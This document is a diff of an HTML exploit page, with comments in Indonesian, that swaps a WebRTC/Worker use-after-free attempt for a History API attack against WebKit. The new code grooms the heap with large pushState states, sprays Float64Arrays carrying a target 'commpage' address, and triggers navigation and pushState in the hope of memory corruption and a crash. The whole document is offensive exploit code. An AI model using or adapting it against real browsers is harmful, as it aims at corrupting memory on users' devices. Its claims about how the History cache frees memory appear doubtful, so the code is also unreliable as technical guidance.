@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRTC UAF Header Corruption (Transfer Focus)</title>
+    <title>History API State Corruption Attack</title>
 </head>
 <body>
 
-    <h1>WebRTC Header Corruption (Transfer Focus)</h1>
+    <h1>History API State Corruption (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Worker dan Transfer Objek...</p>
+    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
     <div id="log-area"></div>
 
     <script>
@@ -20,11 +20,8 @@
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
         let startTime = performance.now();
-        let peerA = null;
-        let peerB = null;
-        let dataChannelA = null;
-        let worker = null;
         let payloadHolders = []; 
+        let historyStates = []; // Menyimpan referensi state
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -33,7 +30,7 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI SPRAY PAYLOAD ---
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
             log("Memulai Spraying Payload...", "log-spray");
             const SPRAY_COUNT = 1500;
@@ -43,98 +40,74 @@
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2030.0 + i; 
+                payloadArray[2] = 2031.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
         }
 
         // --- FUNGSI UTAMA ATTACK ---
-        async function runWebRTCAttack() {
+        function runHistoryAttack() {
             startTime = performance.now();
-            log("Phase 1: Membuat Peer, Worker, dan Buffer Korban.", "log-init");
+            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
+
+            const HISTORY_COUNT = 100;
+            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
             
-            // 1. Peer Connection Setup
-            const config = { iceServers: [] }; 
-            peerA = new RTCPeerConnection(config);
-            peerB = new RTCPeerConnection(config);
-            dataChannelA = peerA.createDataChannel("exploit_channel", { maxPacketLifeTime: 1, ordered: false });
+            // 1. Fragmentasi Heap dengan History State
+            for (let i = 0; i < HISTORY_COUNT; i++) {
+                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
+                // Isi array dengan nilai yang unik
+                stateArray.fill(0xFEEDFACE + i);
+                
+                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
+                // Ini memaksa serialization dan alokasi memori C++ di History Cache
+                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
+                historyStates.push(stateArray);
+            }
+            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
 
-            // 2. ICE Exchange (Wajib)
-            peerA.onicecandidate = e => peerB.addIceCandidate(e.candidate).catch(() => {});
-            peerB.onicecandidate = e => peerA.addIceCandidate(e.candidate).catch(() => {});
-            const offer = await peerA.createOffer();
-            await peerA.setLocalDescription(offer);
-            await peerB.setRemoteDescription(peerA.localDescription);
-            const answer = await peerB.createAnswer();
-            await peerB.setLocalDescription(answer);
-            await peerA.setRemoteDescription(peerB.localDescription);
-            log("Phase 2: Koneksi Peer dibuat.");
+            // 2. Memicu Corrupt State
+            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
+            window.history.go(-HISTORY_COUNT + 1);
+            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
 
-            // 3. Worker Setup
-            worker = new Worker('worker_webrtc.js');
-            worker.postMessage({ cmd: 'setup', channel: dataChannelA }, [dataChannelA]);
+            // 3. FREE/SPRAY Race
+            // Kita segera membersihkan referensi JavaScript dan melakukan spray
+            // Ini menciptakan UAF di History Cache C++
+            setTimeout(() => {
+                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
+                
+                // Hapus semua referensi JS (memaksa GC)
+                historyStates = null;
+                
+                // Lakukan Spray Payload
+                sprayPayload(); 
+                
+                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
+                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
+                
+                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
+                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
+                attackerState.fill(HIGH_WORD);
+                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
+
+                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
+            }, 100); 
             
-            // 4. UAF Race
-            dataChannelA.onopen = function() {
-                log("Phase 3: DataChannel terbuka. Memulai Transfer UAF.", "log-critical");
-
-                // Buffer Korban (Akan ditransfer ke worker)
-                const victimBuffer = new ArrayBuffer(512); 
-                const victimView = new DataView(victimBuffer);
-                victimView.setUint32(0, 0xAAAAAAAA, true); 
-
-                // Memicu Transfer Buffer (Ownership pindah ke worker)
-                worker.postMessage({ cmd: 'send', buffer: victimBuffer }, [victimBuffer]);
-                
-                // --- KONDISI KRITIS UAF ---
-                // Di thread utama, buffer sekarang "detached".
-                // Namun, WebKit mungkin masih memiliki pointer ke C++ header lama.
-                
-                // Segera setelah transfer, kita lakukan FREE/SPRAY
-                setTimeout(() => {
-                    log("Phase 4: Memicu FREE/SPRAY di Thread Utama.", "log-critical");
-                    
-                    // FREE: Hapus referensi JS yang tersisa (walaupun detached)
-                    // Tidak ada referensi eksplisit, tapi kita tetap spray
-
-                    // SPRAY: Menimpa lokasi header ArrayBuffer yang mungkin kosong
-                    sprayPayload(); 
-                    
-                    // Trigger Dereference (Access ArrayBuffer yang Detached/Corrupt)
-                    try {
-                        log(`Membaca victimBuffer di index 0. Status: ${victimBuffer.byteLength}`, "log-critical");
-                        // Akses DataView yang masih ada di thread utama, berharap header ArrayBuffer sudah ditimpa
-                        const crashValue = victimView.getUint32(0, true);
-                        
-                        log(`Nilai dibaca: 0x${crashValue.toString(16)}`, "log-critical");
-
-                        // Jika crashValue adalah 0xFFFFC320, SUKSES
-                        if (crashValue === LOW_WORD) {
-                            log("SUCCESS: Header ArrayBuffer Corrupt!", "log-success");
-                        }
-                        
-                        // Trigger Final
-                        if (crashValue !== 0xAAAAAAAA) {
-                             let crashObj = {};
-                             crashObj[crashValue] = 1;
-                        }
-
-                    } catch(e) {
-                         log(`JS Exception Terdeteksi: ${e.message} - Menunggu Crash OS.`, "log-critical");
-                    }
-
-                }, 5); 
-            };
+            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
+            setTimeout(() => {
+                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
+                for(let i = 0; i < 50; i++) {
+                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
+                }
+                log("Trigger GC Implisit selesai.", "log-info");
+            }, 200);
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-             if (!window.RTCPeerConnection) {
-                 document.getElementById('status').textContent = 'Gagal: WebRTC tidak didukung.';
-                 return;
-             }
-             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Header Corruption...';
-             setTimeout(runWebRTCAttack, 50);
-             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF Header.';
+            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
+            setTimeout(runHistoryAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
         });
     </script>
     <style>
